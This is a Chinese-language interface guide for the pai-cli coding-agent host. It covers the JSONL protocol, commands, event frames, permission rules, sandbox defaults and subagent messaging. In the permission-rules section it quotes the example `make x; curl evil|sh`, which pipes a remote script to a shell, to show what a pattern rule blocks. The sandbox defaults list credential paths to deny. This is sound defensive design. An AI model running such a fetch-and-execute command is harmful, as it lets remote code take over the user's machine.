# pai-cli 对接文档（外部接口说明）

面向 Electron / 任何宿主客户端。本文覆盖**全部对外接口**：启动方式、协议帧、36 个命令、8 类输出帧、对话框子协议、权限规则、子 agent 可观察面。规格细节与裁决见 `docs/design.md`（v0.5 增补为自足摘要）；v0.4 进程架构见 `docs/migration/design.md`；v0.5 实施方案存于本地工作目录 `docs/plans/`（不入库）。

## 1. 启动与进程约定

```js
spawn("pai-cli", [], {
  cwd: <可选，仅影响默认 thread cwd>,
  env: {
    ...process.env,
    PI_CODING_AGENT_DIR: <配置目录，含 auth.json/settings/sessions/extensions/权限规则>,
    // 自定义 provider 的 key 用 env 注入（models.json 里写 "$GLM_API_KEY" 引用）
    // 官方 provider 的 key 用 auth/set_api_key 命令注入（见 §7）
  },
});
```

- 进程形态（v0.4）：你 spawn 的是 **host 进程**；每个活跃对话各跑一个 host 的 **worker 子进程**（故障与内存按对话隔离）。协议只对着 host 的 stdin/stdout；worker 对客户端完全透明。
- 协议走 **stdin/stdout JSONL**，stderr 是日志（无协议含义；worker 的日志带 `[pai:worker:<threadId>]` 前缀转发到 host stderr）。
- 进程生命周期：stdin EOF / SIGTERM / SIGINT → host 优雅停掉全部 worker（落盘会话）并 exit 0。
- 心跳：stdout 每 1 秒一帧 `{"type":"heartbeat"}`；**超过 10 秒没有心跳 = 进程卡死**，杀掉重启后用 `thread/resume` 恢复各会话（`thread/list` 的 `sessionPath` 先持久化到你的注册表）。
- 环境旋钮（v0.6 汇总；当前生效值可用 `get_host_info.limits` 回读）：`PAI_MAX_THREADS`（32）、`PAI_IDLE_RETIRE_MS`（900000）、`PAI_WORKER_STALE_MS`（30000）、`PAI_WORKER_EXIT_TIMEOUT_MS`（10000）、`PAI_MAX_SUBAGGENTS`（16，全局**正在运行**孙进程上限，超出时该任务立即失败、模型可重试）、`PAI_BASH_TIMEOUT_MS`（600000，直执行 bash 服务端墙钟；`0` 关闭）、`PAI_SANDBOX`（v0.7，`off|0|false` 强制关闭执行沙箱）。

## 2. 协议基础

- 请求：一行一个 JSON 对象，`type` 必填，`id` 可选（建议始终带，用于关联响应）。
- 响应契约：**每个带 `id` 的命令恰好收到一个 `response` 帧，`id` 回显**。`prompt` 的 response 表示"已接受"，回复内容走事件流。
- 行上限 16 MiB：超限整行丢弃并回 parse failure。
- 错误统一形态：`{"type":"response","success":false,"error":"英文描述"}`，进程不会因单条命令失败而退出。

## 3. 命令总览（38 个）

| 组               | 命令                                                                                                                 |
| ---------------- | -------------------------------------------------------------------------------------------------------------------- |
| 线程生命周期     | thread/start、thread/resume、thread/stop、thread/list、thread/list_saved                                             |
| 对话驱动         | prompt、steer、follow_up、abort、clear_queue、compact                                                                |
| 状态与历史       | get_state、get_messages、get_entries、get_tree、get_session_stats、set_session_name、get_commands、get_fork_messages |
| 会话树/分叉      | fork、clone、navigate_tree                                                                                           |
| 模型             | get_models、set_model、set_thinking_level、get_thinking_levels                                                       |
| 凭据             | auth/list、auth/set_api_key、auth/remove_key                                                                         |
| 直执行           | bash、abort_bash                                                                                                     |
| 对话框           | ui_response                                                                                                          |
| 子 agent 通信    | subagent/steer                                                                                                       |
| 权限（v0.5）     | get_permission_rules、set_permission_rules                                                                           |
| agent（v0.5）    | agents/list                                                                                                          |
| 宿主信息（v0.6） | get_host_info                                                                                                        |

## 4. 命令明细

### 线程生命周期

**`thread/start`** — 新建对话（= 新会话文件）。
字段：`cwd?`（工作目录，决定 agent 操作的项目与项目级 `.pi` 资源）、`provider?`+`modelId?`（初始模型，两者需成对）、`trusted?`（默认 false：不加载项目 `.pi/extensions` 里的任意代码扩展；true 才加载）。
响应：`{threadId, cwd, sessionPath}`。`threadId` = 会话 id，后续命令都靠它。

**`thread/resume`** — 恢复历史会话（窗口重开 / hub 重启恢复用）。
字段：`sessionPath`（必填，**必须是绝对路径**——回传 `thread/start`/`thread/resume` 响应里的原值即可；相对路径、文件不存在、或文件不在 `<agentDir>/sessions/` 目录之下——含符号链接指向圈外——都会回 `failure`，**不会**静默开出一个空会话，也不可借此加载磁盘上任意会话格式文件）、`cwd?`（缺省取**会话文件头记录的 cwd**）、`trusted?`。
响应同 start。同一文件在本 hub 内已打开 → `success:false`（先 `thread/stop` 旧线程再 resume）。恢复后历史用 `get_entries`（首屏 `limit` 取尾部 + `before` 向前翻页；避免 `get_messages` 全量单帧）拉取渲染。
撕裂写容忍（实测钉死，e2e-mock `torn-session-file` 场景回归）：末行截断（断电类）与中部坏行都能恢复——坏行被丢弃、**完好前缀逐条保留**；仅会话头的文件恢复为空对话；零字节文件恢复成功但 pi 会合成新 sessionId（已知 v1 边界：从未持久化的会话本就无历史可丢）。

**`thread/stop`** — 释放对话（dispose，会话文件保留）。幂等：未知 id 也回 success。配合 resume 实现"闲置回收"。

**`thread/list`** — 会话表：`[{threadId, cwd, sessionPath, isStreaming, state}]`。`state`：`live`（有 worker 进程；`isStreaming` 来自最近心跳，陈旧度 ≤1s，精确值用 `get_state`）/ `parked`（已闲置收编，下条命令自动唤醒）/ `dead`（worker 异常死亡，见 `thread_died`）。崩溃恢复的注册表来源。

**`thread/list_saved`** — 落盘会话列表（历史会话页）。字段：`cwd?`。响应 `{sessions:[...]}`。

### 对话驱动

**`prompt`** — 发用户消息。字段：`threadId`、`message`、`images?`（`[{type:"image",data:base64,mimeType}]`）、`streamingBehavior?`。
关键语义：**agent 正在流式中再发 prompt 必须带 `streamingBehavior`**，`"steer"`（当前轮工具执行完、下次调模型前插入）或 `"followUp"`（本轮完全结束后投递），否则被拒。回复内容不在 response 里，看 `event` 帧（§5）。

**`steer` / `follow_up`** — 显式排队（字段：`threadId`、`message`、`images?`）。队列变化会推 `queue_update` 事件。

**`abort`** — 停止当前轮（也会 settle 该线程挂起的确认框）。
**`clear_queue`** — 清空排队消息并返回文本：`{steering:[], followUp:[]}`。Esc 键语义 = `clear_queue` + `abort`。

**`compact`** — 压缩上下文（LLM 总结历史）。字段：`customInstructions?`。响应含 summary/tokens；上下文太小会被 pi 拒（"too small"，属正常响应）。**长操作：响应在压缩完成时才返回**（可能远超普通命令的秒级），客户端应设长超时或无超时；中断用 `abort`。

### 状态与历史

**`get_state`** — 单次往返拿到面板所需的全部状态：`{model, thinkingLevel, isStreaming, isCompacting, sessionId, sessionName, sessionFile, messageCount}`。

**`get_messages`** — 当前分支全量消息（`AgentMessage[]`：user/assistant/toolResult/bashExecution），**无分页、单帧可随会话无限增长**（数十 MB 级会话产生等量单行帧）。仅适合小会话/诊断；UI 水化与长会话一律用 `get_entries` 的 `limit` 分页。

**`get_entries`** — 会话条目（追加序树）。游标与分页：

- `since?`（前向游标，增量）：传"已见的最后一条 entry id"，只返回其后条目——**跨进程重启也有效**（entry id 持久）。
- `before?`（后向游标，翻页）：只返回该 entry id **之前**（更旧）的条目，配合 `limit` 向前翻页。
- `limit?`（正整数，≤5000）：窗口内只返回**最近的 N 条**；响应的 `hasMore`（恒返回）在窗口内还有更旧条目被截去时为 true。不传 = 全量（旧语义，长会话慎用）。
- 响应：`{entries, leafId, hasMore}`。首屏水化推荐 `get_entries {threadId, limit: N}` 取尾部，`hasMore` 为 true 时用 `before: 返回的最旧 entry id` 继续向前翻。
- 注意：切片按追加序，`navigate_tree` 切分支后增量里可能含已放弃分支的条目，重建活动分支对话要配合 `get_tree`/`leafId`。

**`get_tree`** — 会话树 `{tree, leafId}`（分支导航 UI 用）。

**`get_session_stats`** — `{userMessages, assistantMessages, toolCalls, toolResults, tokens:{...,total}, cost, contextUsage?}`（状态栏用量显示）。

**`set_session_name`** — 会话显示名（窗口标题/会话列表）。空串被拒。
**`get_commands`** — 斜杠命令/技能枚举（输入框 `/` 补全）：`[{name, description?, source: extension|prompt|skill}]`。
**`get_fork_messages`** — 可作为分叉点的用户消息列表（`[{entryId, text}]`，分叉选择器 UI）。

### 会话树 / 分叉

**`fork`** — 从历史条目分叉出新会话。字段：`threadId`、`entryId`（来自 get_entries/get_fork_messages）、`position?`：`"before"`（默认，从该用户消息之前重试——响应带 `text` 原文）或 `"at"`（含该条目复制）。
**响应 `{threadId: 新, previousThreadId: 旧, sessionPath, text, cancelled}`。threadId 已换新：旧 id 立即失效（查询回 Unknown threadId），把窗口路由到新 id。** `cancelled:true`（扩展拦截）时会话未变，忽略 threadId 字段。
fork/clone 失败语义：校验类失败（如 entry 不存在、会话未落盘）→ `success:false`，**线程保留可继续使用**；罕见的替换中途失败（会话已被销毁）→ `success:false` + 一帧 `thread_died`（旧会话文件已落盘，可 `thread/resume` 恢复）。

**`clone`** — 在当前 leaf 复制分叉（等价 fork at leaf）。响应同 fork。同样换 id。

**`navigate_tree`** — 会话内跳转 leaf（不换文件、不换 threadId）。字段：`targetId`、`summarize?`/`customInstructions?`/`replaceInstructions?`/`label?`。

### 模型

**`get_models`** — 全部可用模型（含各 provider）。自定义 provider（agentDir 的 `models.json`，支持 `"$ENV_VAR"` 引用 key）自动出现在这里。
**`set_model`** — 每 thread 独立切换。字段：`provider`+`modelId`。
**`set_thinking_level` / `get_thinking_levels`** — 思考档位（off/minimal/low/medium/high/xhigh/max，以模型支持为准）。

### 凭据（v0.2，API key）

**`auth/list`** — 已存凭据 `[{provider, type}]`（永不含 key 本身）。
**`auth/set_api_key`** — 存 key（运行时生效+落盘 auth.json）。字段：`provider`（须为内置 provider 且支持 key）、`apiKey`。安全保证：key 不出现在任何输出帧/stderr（含错误路径）。已存在 OAuth 凭据时拒绝（防覆盖订阅登录）。需要交互式多字段的 provider（如 bedrock）会被拒。
**`auth/remove_key`** — 删除 key 凭据；对 OAuth 凭据拒绝（防误删）。幂等。

### 直执行 bash（用户在输入框跑命令）

**`bash`** — 字段：`threadId`、`command`、`excludeFromContext?`（不喂给模型）、`timeoutMs?`（v0.6，见下）。**先过权限门**（与 agent 工具调用同一套规则+弹窗，§6），通过后执行。流式输出经事件帧 `bash_execution_update`（带命令 `id`）实时到达；最终 `BashResult` 在 response（output/exitCode/cancelled/truncated/fullOutputPath?）。**与 prompt 不同，bash 是长操作：response 在命令执行完成时才返回**（构建/安装类命令可达分钟级），客户端应设长超时或无超时，取消用 `abort_bash`。输出会记入会话、在下一次 prompt 时进入模型上下文。
`timeoutMs`（服务端墙钟，v0.6）：正整数 ≤ 86_400_000；`0` = 显式关闭本命令超时；缺省取环境旋钮 `PAI_BASH_TIMEOUT_MS`（默认 600_000 = 10 分钟，同样支持 `0` 关闭）。到点服务端触发中止：response 为 `success:true` + `BashResult.cancelled:true`（与 abort_bash 同形，不是 failure）；非法值（负数/非整数/超上限）→ failure。注意：到点触发的是 pi 的会话级 `abortBash`，它会中止**该会话全部运行中的 bash**——包括并发发出的其他直执行命令（哪怕那条带 `timeoutMs:0`）；并发直执行需要互相隔离时请用独立线程。扩展经 `user_bash` 替换执行的路径不受服务端计时（扩展自身责任，与 pi RPC 模式一致）。
**`abort_bash`** — 中止运行中的直执行命令。

### 对话框应答

**`ui_response`** — 应答 `ui_request`（§6）。字段：`requestId`、`payload`（按 method 而定）。任何情况下都会收到 ack（晚到/未知 id 静默忽略并 ack）。

### 权限规则（v0.5，每对话独立）

**`get_permission_rules`** — 字段 `threadId`。响应 `{rules, source}`：`source:"thread"`（该对话有独立 sidecar）或 `"global"`。host 本地命令：对 parked/dead 线程同样可用，纯文件读、不唤醒 worker。

**`set_permission_rules`** — 字段 `threadId`、`rules`（形状同 §7 的 rules 对象）或 `null`。`null` = 删除该对话的 sidecar、回退全局规则（幂等）。**严格校验**：形状非法（未知字段/坏类型/坏 mode）回 failure，不静默降级。生效即时：worker 下一次工具/直执行调用即按新规则判定（文件即真相，无内存缓存）。fork/clone/任何会话替换会把 sidecar 复制到新 threadId。

### agent 定义枚举（v0.5）

**`agents/list`** — 字段 `threadId?`。host 本地命令：返回 `[{name, description, source:"user"|"project", tools?, model?}]`。带 threadId 时按该线程的信任级与 cwd 决定是否含项目级 `.pi/agents`（仅 `trusted:true` 线程可见，同名项目级覆盖 user 级）；不带则仅 user 级。设置界面用它枚举可管理的 agent；模型侧的 task 工具按同一作用域热发现。

### 宿主信息（v0.6，host 本地）

**`get_host_info`** — 无字段，host 本地应答（不唤醒任何 worker）。生产排障的单点入口：`{version, piVersion, bunVersion, pid, uptimeMs, rssBytes, threads:{live,parked,dead}, subagents:{running}, limits:{maxThreads, idleRetireMs, workerStaleMs, workerExitTimeoutMs, maxSubagents, bashTimeoutMs}}`。版本为 host 启动期一次性读取（pai-cli / pi SDK / bun）；`subagents.running` 是全局**正在运行**的孙进程数（grant 账本口径，非心跳的在飞口径）；`limits` 回显当前生效的全部环境旋钮值。不含任何路径、env 或凭据信息。

### 沙箱（v0.7，agent 执行沙箱）

**配置**（文件即真相，**会话创建时快照**——改动需 thread/stop+resume 或 host 重启，与权限规则的热读不同）：

- 全局 `<agentDir>/sandbox.json`；项目级 `<cwd>/.pi/sandbox.json` **仅 `trusted:true` 线程合并**（防恶意仓库自我松绑）；坏文件降级默认永不抛错；分节合并、数组整体替换。
- **默认 `enabled:true`**（用户裁决：默认开启可关）。默认策略：网络白名单 = 回环 + npm/pypi/github 系域名；`denyRead: ["~/.ssh","~/.aws","~/.gnupg"]`；`allowWrite: [".","/tmp"]`（"." = 会话 cwd）；`denyWrite: [".env",".env.*","*.pem","*.key"]`。两份 sandbox.json 自身恒为 write 工具的 denyWrite（防篡改未来会话快照）。
- 机器级逃生舱：`PAI_SANDBOX=off|0|false` 强制全局关闭。

**语义**（两层强制，一道防线在权限门之后）：

- **bash（agent 工具 + 直执行）**：OS 级包裹（macOS sandbox-exec / Linux bubblewrap，需 bwrap）。被拒表现为命令自身的非零退出与 stderr（模型可见自适应）。平台不支持或初始化失败 → bash 不包裹（fail-open）+ `degraded` 可见 + stderr 警告一次；write/edit/read 检查不受影响。
- **write/edit**：`allowWrite` 目录包含之外的路径、或命中 `denyWrite` → 直接 block（不弹窗）。路径按 pi 工具语义解析（`~`/`file://`/`@`/unicode 空格归一）+ realpath 效应空间；比较 NFC 归一、大小写折叠（darwin/win32）。
- **read**：`denyRead` 命中 → block。
- 权限门先裁决（弹窗展示原始命令），沙箱后强制；权限门 block 的调用到不了沙箱。

**`get_sandbox_state`** — 字段 `threadId`。→ `{enabled, platform, degraded?, network, filesystem, source:"global"|"global+project", bashSandboxed:boolean}`（bashSandboxed = OS 层实际生效；enabled:true 但 bashSandboxed:false 即降级态）。

### 子 agent 通信（v0.5 stage 7）

**`subagent/steer`** — 字段 `threadId`、`subagentId`、`message`。向该对话**运行中**的后台子 agent 注入一条 steer（在孙进程当前工具调用后、下次模型调用前生效）。与模型侧 `task_steer` 工具同一管线。非 running（queued/settled/unknown）→ `success:false`（错误文案含当前状态）。

## 5. 输出帧（stdout → 客户端）

| 帧                        | 说明                                                                                                                                                                                         |
| ------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `response`                | 命令应答（§2 契约）                                                                                                                                                                          |
| `event`                   | `{"type":"event","threadId":...,"event":{...}}`——全部 AgentSessionEvent 打 threadId 标签，同线程内有序                                                                                       |
| `ui_request`              | 确认/输入请求（§6）                                                                                                                                                                          |
| `heartbeat`               | 1Hz 心跳（host 发出；有任何子 agent 在途时带 `subagents` 计数 = queued+running，前台委派也计入）                                                                                             |
| `hub_error`               | 未捕获异常报告（进程不退出；心跳消失才需要杀 host 进程）；worker 内的异常带 `threadId` 字段                                                                                                  |
| `thread_died`             | `{"threadId", "reason"}`：该对话的 worker 异常死亡（v0.4）。线程转 `dead`，下条命令自动恢复                                                                                                  |
| `subagent_event` (v0.5)   | `{"threadId","subagentId","agent","task","event"}`：子 agent（grandchild 进程）的会话事件原样转发，按 `subagentId` 分组渲染                                                                  |
| `subagent_message` (v0.5) | `{"threadId","subagentId","agent","text","to?"}`：子 agent 的 `report`/`send` 工具产出（阶段 8/9）。worker 用自己注册表重盖身份（孙自报 id 不可信）；`to` 仅兄弟路由时存在（父模型中介转发） |

**渲染聊天界面需要的核心事件**（`event.type`）：

| 事件                                                  | 用途                                                                                                                                                                             |
| ----------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `message_start` / `message_end`                       | 一条消息开始/权威结束（`message_end.message` 是最终内容）                                                                                                                        |
| `message_update`                                      | 流式增量：`assistantMessageEvent.type = text_start/text_delta/text_end、thinking_*、toolcall_*`。**帧里没有累积快照**（已剥离），客户端自行拼接 `text_delta.delta`；usage 在顶层 |
| `tool_execution_start/update/end`                     | agent 工具调用进度（`partialResult` 是"到目前为止"的累积，直接替换渲染即可）                                                                                                     |
| `agent_start` / `agent_end` / `agent_settled`         | 一轮开始 / 单次运行结束 / **彻底结束**（UI 的"回复完成"信号）                                                                                                                    |
| `queue_update`                                        | steer/followUp 队列变化（`{steering:[],followUp:[]}`）                                                                                                                           |
| `bash_execution_update`                               | 直执行 bash 的流式输出块（带命令 id）                                                                                                                                            |
| `turn_start/turn_end`、`compaction_*`、`auto_retry_*` | 过程性状态（进度条/提示条）                                                                                                                                                      |

## 6. 对话框子协议（权限确认等）

hub 发 `{"type":"ui_request","requestId":..,"threadId":..,"method":..,...}`：

| method                        | 语义                                     | 应答 payload                                |
| ----------------------------- | ---------------------------------------- | ------------------------------------------- |
| `confirm`                     | 权限确认（bash 命令 / write·edit 路径）  | `{"confirmed": true/false}`                 |
| `select` / `input` / `editor` | 扩展的列表/输入/编辑请求                 | `{"value": "..."}` 或 `{"cancelled": true}` |
| `notify` / `setStatus`        | 提示/状态条（fire-and-forget，无需应答） | —                                           |

超时语义：权限确认默认 5 分钟无人应答自动**拒绝**（agent 不被卡死）；晚到应答被忽略但一定有 ack。

## 7. 权限规则（agent 工具与直执行 bash 共用）

文件：`<agentDir>/permission-rules.json`，**每次工具调用热读**（设置界面改完即生效，无需重启）：

```json
{
  "mode": "ask",
  "bash": { "allowPatterns": ["git status", "npm run *"], "blockPatterns": ["sudo *"] },
  "write": { "allowPatterns": ["/Users/me/proj/*"], "blockPatterns": ["*/.env"] },
  "edit": { "blockPatterns": ["*/.env*"] }
}
```

判定顺序：`allow-all` 全放行（含 block）→ `block-all` 全拦 → 命中 blockPatterns 拦 → 命中 allowPatterns 放——**bash 组合命令逐段校验**：`;` `&&` `&` `||` `|` 换行分段的每一段都须各自命中某条 allow 模式，且反引号/`$(`/`<`/`>`（替换与重定向）出现即降级 `ask`（`"make *"` 不放行 `make x; curl evil|sh`；`"echo *"`+`"sleep *"` 放行 `echo a && sleep 1 && echo b`）→ 其余 `ask` 弹 confirm。`*` 跨任意字符（含 `/`），分段线性匹配；bash 匹配命令串，write/edit 匹配**解析后的绝对路径**（词法 resolve 到会话 cwd + realpath 收缩已存在目录组件；`..` 与符号链接目录不能逃出 allow 前缀）。坏文件/坏形状自动降级 `{mode:"ask"}`，永不抛错。

## 7.5 子 agent 与后台任务可观察面（v0.5）

模型面工具（task/task_out/task_wait/task_stop）不是对客户端的协议命令，但对客户端有三个可见投影：

1. **`subagent_event` 帧**：每个子 agent 的完整事件流（流式文本、工具调用、agent_settled）实时转发，任务面板按 `subagentId` 分组。后台排队（queued）任务在 spawn 前没有任何事件——回执经 tool result 消息事件可读。
2. **心跳 `subagents` 计数**：在途 = queued + running（留存结果不计入），任务面板的「在途」因此含排队任务。
3. **完成通知是 user-role 消息**：后台任务 settle 后，pai 以**用户角色**注入一条 `[task-notification] subagent <id> (<agent>) completed|failed|stopped.` + 产出摘要（≤8KB）消息并触发一个新的模型回合。三个可观察含义：
   - 你会在 `get_messages`/事件流里看到一条**自己没有发送过**的 user 消息及其触发的模型回合（正常行为，非伪造）；
   - 通知唤起的回合与普通回合**无差别**——它流式期间到达的客户端 `prompt` 仍按 §4 规则失败（须 steer）；
   - 通知唤起 = 自动消耗一个模型回合（token 成本；模型 opt-in `background:true` 时接受）。

停止语义（U2）：客户端 `abort` / `thread/stop` / 进程关闭会**杀掉该对话全部子 agent**（前台+后台，ephemeral 不可恢复）；被杀任务**不发通知**（`task_stop` 停的单个任务照发）。worker 死亡同样使在途任务随 stdin EOF 自灭，客户端收 `thread_died`。

### agent 间通信（v0.5 阶段 7-9，同一批 §三扇门）

- **steer（父/客户端 → 运行中的子）**：协议命令 `subagent/steer` 与模型工具 `task_steer {subagentId, message}` 同管线（fire-and-ack，孙进程当前工具调用后注入）。非 running 一律 failure。
- **子上报（子 → 父）**：孙进程内置 `report {text}` 工具 → `subagent_message` 帧转发（可观察）+ 带信封 `[task-message] from subagent <id> (<agent>):` 入通知队列（回合边界投递，与完成通知同一机制）。
- **兄弟路由（子 ↔ 子，父中介）**：模型工具 `task_send {to, message}` 仅允许 running 目标（信封 `[from: lead via task_send]`）；孙进程 `send {to, text}` → `subagent_message` 帧（带 `to`）→ **唤醒父模型决定是否 task_send 转发**——路由智能在 lead，无独立路由引擎。
- **护栏**：每任务 report+send 合计 ≤10 条、每条 ≤8KB（孙侧工具与父侧注册表双重执行）；项目级（不受信）agent 的消息标注 `unverified data`；深度 1 不变（孙进程没有 task 工具，通信工具不派生任务）；父从不信任孙自报的 subagentId（按注册表重盖）。

### 权限规则的子 agent 语义（v0.5）

子 agent 不冻结 spawn 时的权限快照：孙进程的权限门**每次工具调用热读父对话的规则**（sidecar → 全局，与 §7 同一判定链）。父对话中途 `set_permission_rules` 收紧会即时传导到运行中的后台子 agent。

```
→ {"id":"1","type":"thread/start","cwd":"/proj","provider":"glm","modelId":"glm-5.3-flash"}
← {"id":"1","type":"response","command":"thread/start","success":true,"data":{"threadId":"t1",...}}
→ {"id":"2","type":"prompt","threadId":"t1","message":"跑一下测试"}
← {"id":"2","type":"response","command":"prompt","success":true}          # 已接受
← {"type":"event","threadId":"t1","event":{"type":"message_start",...}}
← ... message_update(text_delta) ...  tool_execution_start(bash) ...
← {"type":"ui_request","requestId":"r1","threadId":"t1","method":"confirm","message":"npm test"}   # 权限询问
→ {"id":"3","type":"ui_response","requestId":"r1","payload":{"confirmed":true}}
← {"id":"3","type":"response","command":"ui_response","success":true}
← ... tool_execution_end ... message_end ...
← {"type":"event","threadId":"t1","event":{"type":"agent_settled"}}       # 本轮完成
→ {"id":"4","type":"get_entries","threadId":"t1","since":"<上次最后entryId>"}
← {"id":"4","type":"response",...,"data":{"entries":[...],"leafId":"..."}}
```

## 9. 客户端侧 checklist

- [ ] 心跳监督（>10s 无心跳 → 杀 host + thread/list 注册表逐个 resume）
- [ ] `thread_died` 处理：标记窗口（可提示用户），下条命令自动恢复；或用 `thread/list` 里的 `sessionPath` 主动 resume
- [ ] response 按 id 关联；`agent_settled` 驱动输入框可用态
- [ ] 流式渲染只拼 `text_delta.delta`，以 `message_end.message` 为权威
- [ ] `fork/clone` 后用响应里的新 `threadId` 重路由窗口，旧 id 立即失效
- [ ] 弹窗应答永远回 `ui_response`（哪怕用户已关闭弹窗 → 回 `{"cancelled":true}`）
- [ ] 每线程记录 `sessionPath`（崩溃/闲置恢复的锚点）
- [ ] 子 agent 面板：`subagent_event` 按 `subagentId` 分组；心跳 `subagents` 做在途徽标；`[task-notification]` user 消息按系统提示样式渲染（非用户输入）
- [ ] `abort` 语义确认：会杀后台任务且不可恢复（如需选择性停，引导用户/模型用 task_stop）
- [ ] `subagent_message` 帧：report 按子 agent 分组渲染（与 subagent_event 同面板）；带 `to` 的兄弟路由请求按「待 lead 转发」样式提示
- [ ] `subagent/steer` / task_steer 失败文案按状态呈现（queued/settled/unknown）
